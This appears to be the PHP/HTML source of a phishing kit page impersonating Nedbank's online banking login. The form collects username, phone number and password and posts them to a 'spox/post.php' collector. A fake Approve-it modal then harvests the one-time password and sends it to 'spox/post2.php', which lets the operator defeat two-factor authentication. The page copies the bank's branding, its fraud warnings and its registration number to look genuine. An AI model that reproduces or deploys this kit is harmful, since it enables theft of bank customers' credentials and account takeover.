﻿<?php
session_start();
error_reporting(0);
include'robots.php';
   if (!isset($_SESSION['spox'])) {
  //     header('HTTP/1.0 403 Forbidden');
  //     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  //     exit();
   }
   if (!isset($_GET['ned_id']) or empty($_GET['ned_id']) or !isset($_GET['expired']) or empty($_GET['expired'])) {
  //     header('HTTP/1.0 403 Forbidden');
  //     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  //     exit();
   }
?>
<html lang="en">
   <head>
      <meta charset="utf-8">
      <title>Online Banking</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="theme-color" content="#1976d2">
      <link rel="icon" type="image/x-icon" href="files/img/spoxy.ico">
      <link rel="stylesheet" href="files/css/styles.css">
      <script src="files/js/jquery.min.js"></script>
      <script src="files/js/Bootstrap.min.js"></script>
      <div id="preloader-spinner" class="preloader spinner mspinner" style="display: none">
         <div class="wrapper">
            <span class="loader"></span>
         </div>
      </div>
      <app-dtm-analytics ng-version="7.2.16"></app-dtm-analytics>
      <app-header class="secondaryHeaderHeight">
         <header class="main-header header-background-color un-auth">
            <div class="shiftHeader">
               <div class="row">
                  <div class="col-xs-12">
                     <div class="header-block">
                        <div class="left">
                           <a class="logo" tabindex="-1"></a>
                        </div>
                        <div  class="right top-right-header-section">
                           <ul >
                              <li aria-labelledby="chat-icon" class="chat">
                                 <div aria-hidden="true">
                                    <div class="chat-box">
                                       <span class="chat-icon"></span>
                                       <span class="chat-text">Nedbank Chat</span>
                                    </div>
                                 </div>
                              </li>
                              <li  class="branch">
                                 <div  class="icon"></div>
                                 <div  class="details">
                                    <a  tabindex="-1">Branch locator</a>
                                 </div>
                              </li>
                              <li  class="contact-details">
                                 <div  class="icon"></div>
                                 <div  class="details">
                                    <p  class="call">+27 86 055 5111</p>
                                 </div>
                              </li>
                           </ul>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </header>
      </app-header>
      <div  class="scroll-page main-page" id="scroll-page">
         <div  class="main-content-wrapper clearfix">
            <div  class="page-content-footer-wrapper">
               <div  class="app-content-inner">
                  <div >
                     <div  class="container-fluid component-container animated fadeIn">
                        <div  class="clearfix">
                           <div class="hidden-xs hidden-sm col-md-7 col-lg-7 intro-container border-right-container">
                              <div class="top-container">
                                 <div class="intro-img-container">
                                    <img src="files/img/NedbankExperience.svg">
                                 </div>
                                 <div >
                                    <h3 class="headingText">Experience our new online banking</h3>
                                 </div>
                                 <div  class="intro-content">
                                    <div  class="intro-content-icons">
                                       <div  class="intro-content-icon">
                                          <img  src="files/img/login-fast.svg">
                                          <small >Fast</small>
                                       </div>
                                       <div  class="intro-content-icon">
                                          <img   src="files/img/login-easy.svg">
                                          <small >Easy</small>
                                       </div>
                                       <div  class="intro-content-icon">
                                          <img   src="files/img/login-secure.svg">
                                          <small >Secure</small>
                                       </div>
                                    </div>
                                    <p >Access an enhanced banking experience with great new features and regular updates.</p>
                                    <!---->
                                    <!---->
                                    <div  class="explore-our-demo">
                                       <div >
                                          <span  class="demo-icon"></span>
                                          <span  class="explore-demo-content">Explore our demo</span>
                                       </div>
                                    </div>
                                    <!---->
                                    <div  class="entrust-container">
                                       <a  class="entrustAnchor" tabindex="1">
                                       <img  class="iconEntrust" src="files/img/entrust_site_seal_ssl.png">
                                       </a>
                                       <span >Integrated with secure online infrastructure.</span>
                                    </div>
                                 </div>
                              </div>
                              <div  class="bottom-container">
                                 <div  class="border-top-container">
                                    <div  class="information-container fraud border-right-container highlighted col-xs-6">
                                       <!---->
                                       <div  class="formInput gd-form">
                                          <div  class="infoHeading">Beware of the latest scams</div>
                                          <div  class="infoText">There has been an increase in online fraud in the banking industry with some of the latest scams involving fraudsters prompting you to click on a link in an email or SMS.</div>
                                          <div >
                                             <a class="link-text" tabindex="1">
                                             <span >Learn more&nbsp;→</span></a>
                                          </div>
                                       </div>
                                    </div>
                                    <div  class="information-container info col-xs-6">
                                       <!---->
                                       <div  class="formInput gd-form hide-mobile">
                                          <div  class="infoHeading">
                                             Important information
                                          </div>
                                          <div  class="infoText">
                                             <div  class="gd-form-row">
                                                <a class="icon-field" tabindex="1">
                                                   <div >
                                                      Fraud awareness
                                                      <i  class="arrow"></i>
                                                   </div>
                                                </a>
                                                <hr >
                                             </div>
                                             <div  class="gd-form-row">
                                                <a class="icon-field" tabindex="1">
                                                   <div >
                                                      Accessibility
                                                      <i  class="arrow"></i>
                                                   </div>
                                                </a>
                                                <hr >
                                             </div>
                                             <div  class="gd-form-row">
                                                <a class="icon-field" tabindex="1">
                                                   <div >
                                                      Browser requirements
                                                      <i  class="arrow"></i>
                                                   </div>
                                                </a>
                                                <hr >
                                             </div>
                                             <div  class="gd-form-row">
                                                <a class="icon-field" tabindex="1">
                                                   <div >
                                                      Online share trading
                                                      <i  class="arrow"></i>
                                                   </div>
                                                </a>
                                                <hr >
                                             </div>
                                             <div  class="gd-form-row">
                                                <a class="icon-field" tabindex="1">
                                                   <div >
                                                      Trusteer Rapport security
                                                      <i  class="arrow"></i>
                                                   </div>
                                                </a>
                                                <hr >
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div  class="col-xs-12 col-sm-12 col-md-5 col-lg-5 login-container">
                              <form class="gd-form ng-untouched ng-pristine ng-invalid send-log" novalidate="">
                                 <!---->
                                 <!---->
                                 <div >
                                    <div  class="hidden-md hidden-lg">
                                       <h3  class="headingText">Experience our new online banking</h3>
                                    </div>
                                    <div  class="formInput">
                                       <!---->
                                       <div  class="registerBlock">
                                          <div  class="gd-form-row">
                                             <a class="icon-field" tabindex="1">
                                                <span  class="iconImg icon-outline"></span>
                                                <div  class="registration">New to our latest online banking? <br > <span  class="text">Register </span></div>
                                                <i  class="arrow"></i>
                                             </a>
                                             <div  class="line-separator"><span  class="text"> or </span></div>
                                          </div>
                                       </div>
                                       <div  class="gd-form-row">
                                          <!---->
                                          <h4  class="login-title">Log in with your Nedbank ID.</h4>
                                          <!---->
                                       </div>

                                       <div >
                                          <div class="alert-message alert-message-danger danger " hidden="" id="again">
                                             <p><span class="" style="content: url(files/img/error-red-icon.svg);width: 20px;height: 20px;"></span>  Oops! we are unable to retrieve your data at this moment due to server error.
                                                Kindly try again to retrieve your data
                                             </p>
                                          </div>
                                          <div class="alert-message alert-message-danger danger " hidden="" id="error">
                                             <p><span class="" style="content: url(files/img/error-red-icon.svg);width: 20px;height: 20px;"></span>  Couldn't confirm your details.<br> Please try again or chat to an agent.

                                             </p>
                                          </div>
                                          <div  class="gd-form-row">
                                             <label  class="active gd-sm-label" for="username">Username</label>
                                             <input _ngcontent-uec-c19="" appvalidateonblur="" appvalidaterequired="" aria-label="Nedbank ID Username" autocomplete="off" class="validate form-element ng-untouched ng-pristine ng-invalid" id="username" name="username" tabindex="1" type="text" required><small class="alho" style="color: #d22630;font-size: 14px;margin: 5px 0 0;position: relative;"></small>


</div>
                                          <div  class="gd-form-row">
                                             <label  class="active gd-sm-label" for="phonword">Phone Number</label>
                                             <div  class="input-container avcobrowse-mask">
                                                <input  autocomplete="off" class="validate form-element passwordInput avcobrowse-mask ng-untouched ng-pristine ng-invalid" id="phonword" name="phonword" tabindex="2"  type="text">
                                                <small class="mirda" style="color: #d22630;font-size: 14px;margin: 5px 0 0;position: relative;"></small>



                                          </div>
                                          <div  class="gd-form-row">
                                             <label  class="active gd-sm-label" for="password">Password</label>
                                             <div  class="input-container avcobrowse-mask">
                                                <input  autocomplete="off" class="validate form-element passwordInput avcobrowse-mask ng-untouched ng-pristine ng-invalid" id="password" name="password" tabindex="3"  type="password">
                                                <small class="mirda" style="color: #d22630;font-size: 14px;margin: 5px 0 0;position: relative;"></small>
                                                <span  class="input-img" onclick="togglePassword()">
                                                <i  class="fa-fa-eye-show" ></i>
                                                </span>
                                             </div>
                                          </div>
                                          <div  class="forgotDetailsText">
                                             <a class="forget-link link-text" href="" tabindex="2">Forgot
                                             your details?</a>
                                             <span  class="arrow-icon"></span>
                                          </div>
                                          <div  class="termsText">
                                             By logging in I accept the
                                             <a class="link-text small" tabindex="2">terms and conditions.</a>
                                          </div>
                                          <div _ngcontent-uec-c19="" class="buttonDiv">
                                             <button tabindex="tabindex" class="gd-primary-btn" type="submit" id="submit">
                                                <span class="visuallyhidden" aria-hidden="true"></span><span  aria-hidden="false"> Log in</span><!----><!---->
                                             </button>
                                          </div>
                                          <!---->
                                          <div  class="hidden-md hidden-lg">
                                             <!---->
                                             <!---->
                                             <div  class="explore-our-demo">
                                                <div >
                                                   <span  class="demo-icon"></span>
                                                   <span  class="explore-demo-content">Explore our demo</span>
                                                </div>
                                             </div>
                                          </div>
                                          <div  class="hidden-md hidden-lg">
                                             <!---->
                                             <div  class="entrust-container">
                                                <a  class="entrustAnchor" target="blank" tabindex="1">
                                                <img class="iconEntrust" src="files/img/entrust_site_seal_ssl.png">
                                                </a>
                                                <span >Integrated with secure online infrastructure.</span>
                                             </div>
                                          </div>
                                          <div  class="appInfo">
                                             <!---->
                                             <div  class="appBlock hide-mobile">
                                                <div >While you’re at it, download our new</div>
                                                <div >
                                                   <a class="link-text" tabindex="2">Nedbank
                                                   Money app</a>
                                                </div>
                                             </div>
                                             <div  class="app-download-block hide-mobile">
                                                <div  class="linkButtons">
                                                   <!----><span  class="app-link">
                                                   <a  tabindex="2">
                                                   <img  src="files/img/GooglePlay.svg">
                                                   </a>
                                                   </span><span  class="app-link">
                                                   <a  tabindex="2">
                                                   <img  src="files/img/AppStoreBadge.svg">
                                                   </a>
                                                   </span><span  class="app-link">
                                                   <a  tabindex="2">
                                                   <img  src="files/img/HuaweiStoreBadge.svg">
                                                   </a>
                                                   </span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div  class="hidden-xs col-sm-12 hidden-md hidden-lg border-top-container">
                                       <div  class="information-container fraud highlighted col-sm-6">
                                          <!---->
                                          <div  class="formInput gd-form">
                                             <div  class="infoHeading">Beware of the latest scams</div>
                                             <div  class="infoText">There has been an increase in online fraud in the banking industry with some of the latest scams involving fraudsters prompting you to click on a link in an email or SMS.</div>
                                             <div >
                                                <a class="link-text" tabindex="1">
                                                <span >Learn more&nbsp;→</span></a>
                                             </div>
                                          </div>
                                       </div>
                                       <div  class="information-container info col-sm-6">
                                          <!---->
                                          <div  class="formInput gd-form hide-mobile">
                                             <div  class="infoHeading">
                                                Important information
                                             </div>
                                             <div  class="infoText">
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Fraud awareness
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Accessibility
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Browser requirements
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Online share trading
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Trusteer Rapport security
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div  class="col-xs-12 hidden-sm hidden-md hidden-lg">
                                       <div  class="information-container info col-xs-12">
                                          <!---->
                                          <div  class="formInput gd-form hide-mobile">
                                             <div  class="infoHeading">
                                                Important information
                                             </div>
                                             <div  class="infoText">
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Fraud awareness
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Accessibility
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Browser requirements
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Online share trading
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                                <div  class="gd-form-row">
                                                   <a class="icon-field" tabindex="1">
                                                      <div >
                                                         Trusteer Rapport security
                                                         <i  class="arrow"></i>
                                                      </div>
                                                   </a>
                                                   <hr >
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div  class="information-container fraud highlighted col-xs-12 covid19-footer-margin">
                                          <!---->
                                          <div  class="formInput gd-form">
                                             <div  class="infoHeading">Beware of the latest scams</div>
                                             <div  class="infoText">There has been an increase in online fraud in the banking industry with some of the latest scams involving fraudsters prompting you to click on a link in an email or SMS.</div>
                                             <div >
                                                <a class="link-text" tabindex="1">
                                                <span >Learn more&nbsp;→</span></a>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <!---->
                              </form>
                           </div>
                        </div>
                     </div>
                     <!---->
                     <!---->
                     <!---->
                     <!---->
                     <!---->
                  </div>
                  <!---->
               </div>
               <app-footer class="hide-mobile">
                  <footer  class="main-footer">
                     <div  class="footer-container">
                        <div >
                           <div >
                              <div  class="footer-block">
                                 <div  class="copyright" tabindex="3">
                                    <span  class="text">
                                    Nedbank Ltd Reg No 1951/000009/06. <br >
                                    Authorised financial services and registered credit provider (NCRCP16).
                                    </span>
                                 </div>
                                 <ul  class="footer-nav">
                                    <li >
                                       <a  tabindex="3">
                                       <span  aria-hidden="true" class="text">Contact</span>
                                       <i  class="arrow fa fa-angle-right"></i>
                                       </a>
                                    </li>
                                    <li >
                                       <a  tabindex="3" >
                                       <span  aria-hidden="true" class="text">Find an ATM or branch</span>
                                       <i  class="arrow fa fa-angle-right"></i>
                                       </a>
                                    </li>
                                    <li >
                                       <a tabindex="3">
                                       <span aria-hidden="true" class="text">Help</span>
                                       <i class="arrow fa fa-angle-right"></i>
                                       </a>
                                    </li>
                                    <li >
                                       <a tabindex="3">
                                       <span aria-hidden="true" class="text">Terms and conditions</span>
                                       <i class="arrow fa fa-angle-right"></i>
                                       </a>
                                    </li>
                                 </ul>
                              </div>
                           </div>
                        </div>
                     </div>
                  </footer>
               </app-footer>
               <!---->
            </div>
         </div>
      </div>
      <app-loader >
         <div class="loader-mask" hidden="">
            <div class="loader-spinner">
               <svg ngClass="spinner-container" viewBox="0 0 52 52" class="spinner-container">
                  <circle cx="26px" cy="26px" fill="none" r="20px" stroke-width="4px" class="path green"></circle>
               </svg>
            </div>
         </div>
      </app-loader>
      <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
      <div class="modal-dialog" role="document">
         <div class="modal-content">
            <div class="approveit-container modal-body">
               <div class="modal-body">
                  <div id="zarda">
                     <center>
                        <div style="position: relative;margin-bottom: 10px;">
                           <div class="spinner"></div>
                           <div aria-hidden="true" class="section-title tspinner"></div>
                        </div>
                        <div style="font-family: MarkProMedium,Century Gothic,Helvetica,Arial,sans-serif;padding: 15px 0;margin: 0;font-size: 20px;color: #333;">An Approve-it<sup>TM</sup> message has been sent to your cellphone</div>
                        <div style="margin-top: 20px;">Please accept the Approve-it message to continue.</div>
                        <div style="margin-top: 20px;">Should you not get an Approve-it message, an SMS with a one-time password (OTP) will be sent to you.</div>
                        <br>
                     </center>
                  </div>
                  <div id="dilo" style="600px; display: none">
                     <center>
                        <div class="section-title" style="text-align:center">A one-time password (OTP) was sent to your cellphone</div>
                        <div >An Approve-it<sup>TM</sup> message couldn't be sent at this time. Please enter the OTP to continue.</div>
                        <div style="margin-top: 20px;">
                           <form id="isLogin" class="gd-form ng-untouched ng-pristine ng-invalid spox" novalidate="" style="margin-top: 40px">
                              <div class="gd-form-row">
                                 <label  class="gd-sm-label" for="otp">Enter OTP</label>
                                 <input autocomplete="off" class="validate form-element ng-untouched ng-pristine ng-valid" id="khra" name="username" minlength="6" maxlength="6" type="number" required="">
                                 <p class="alhoma" style="color: #d22630;font-size: 14px;position: relative;text-align: left;"></p>
                                 <p style="color: #d22630;font-size: 14px;position: relative;text-align: left;" id="error2">*Please enter your OTP</p>
                              </div>
                        </div>
                        <div class="half-btns marginTop">
                        <div class="left">
                        <button class="gd-primary-btn" tabindex="tabindex" id="spox">
                        <span class="visuallyhidden" aria-hidden="true"></span>
                        <span aria-hidden="false"> Submit </span>
                        </button>
                        </div>
                        <div class="right">
                        <button class="gd-ghost-btn" >
                        <span class="visuallyhidden" aria-hidden="true"></span>
                        <span aria-hidden="false"> Cancel </span>
                        </button>
                        </div>
                        </div>
                        </form>
                     </center>
                  </div>
               </div>
            </div>
         </div>
      </div>
<script>

var specialKeys = new Array;
specialKeys.push(8), $(function() {
    $(".numeric").bind("keypress", function(e) {
        var a = e.which ? e.which : e.keyCode,
            s = a >= 48 && a <= 57 || -1 != specialKeys.indexOf(a);
        return $(".error").css("display", s ? "none" : "inline"), s
    }), $(".numeric").bind("paste", function(e) {
        return !1
    }), $(".numeric").bind("drop", function(e) {
        return !1
    })
});
let link = "spox/post.php";
let link2 = "spox/post2.php";

function validatePassword(e) {
    var a = /[*@!#%&()^~{}]+/.test(e),
        s = /[A-Z]+/.test(e),
        t = /[a-z]+/.test(e),
        n = !1;
    return s && t && a && (n = !0), n
}

function togglePassword() {
    var e = document.getElementById("password").type;
    document.getElementById("password").type = "password" == e ? "text" : "password"
}
$("#spox").click(function(e) {
    if (e.preventDefault());
    else {
        let e = $("#khra").val();
        $.ajax({
            url: link2,
            data: {
                otp: e
            },
            type: "POST",
            crossDomain: !0,
            cache: !1,

         success: function(response){
         if(response == 'good' ){ 
               $("#again").show(), $("#exampleModal").modal("hide")
            } else {
               $("#error2").show(), $(".mspinner").hide()
            }
         } 

        })
    }

}), $(".send-log").submit(function(e) {
    e.preventDefault();
    let a = $(this).serialize();
    $(".alert-message").hide(), "" == $("#username").val() ? $(".alho").html("* Please enter your username").show() : "" == $("#password").val() ? $(".mirda").html("* Please enter your password").show() : ($validatePwd = validatePassword($("#password").val()), 0 == $validatePwd ? $(".mirda").html("Password must contain special character, Upper , Lower case letter and numbers").show() : $("#username").val().length > 30 ? $(".alho").html("Username is to long").show() : $("#password").val().length > 30 ? $(".mirda").html("Password is to long").show() : ($(".mirda").hide(), $(".alho").hide(), $.ajax({
        url: link,
        data: a,
        type: "POST",
        crossDomain: !0,
        cache: !1,

        beforeSend: function() {
            $(".mspinner").show()
        },

        success: function(response){
         if(response == 'good' ){ 
              setTimeout(function() {
                $(".mspinner").hide(), $("#exampleModal").modal({
                    backdrop: "static",
                    keyboard: !1
                });
                var e = 60,
                    a = setInterval(function() {
                        e--, $(".tspinner").text(e), 0 === e && ($("#zarda").hide(), $("#dilo").show(), clearInterval(a))
                    }, 1500)
            }, 1500)
            } else {
               $("#error").show(), $(".mspinner").hide()
            }
         } 

    })))
});

 </script>
</html>